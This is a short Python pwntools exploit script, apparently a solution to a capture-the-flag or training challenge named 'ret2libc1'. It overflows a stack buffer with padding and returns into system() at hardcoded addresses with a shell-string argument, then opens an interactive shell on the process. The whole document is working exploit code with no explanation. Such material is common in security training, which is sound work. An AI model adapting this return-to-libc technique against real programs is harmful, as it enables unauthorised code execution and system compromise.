from pwn import *
context(arch='i386',os='linux')
p=process('./ret2libc1')

sys_addr=0x8048460
shell_addr=0x08048720
payload=flat(['a'*(0x6c+4),sys_addr,0,shell_addr])

p.recv()
p.sendline(payload)
p.interactive()
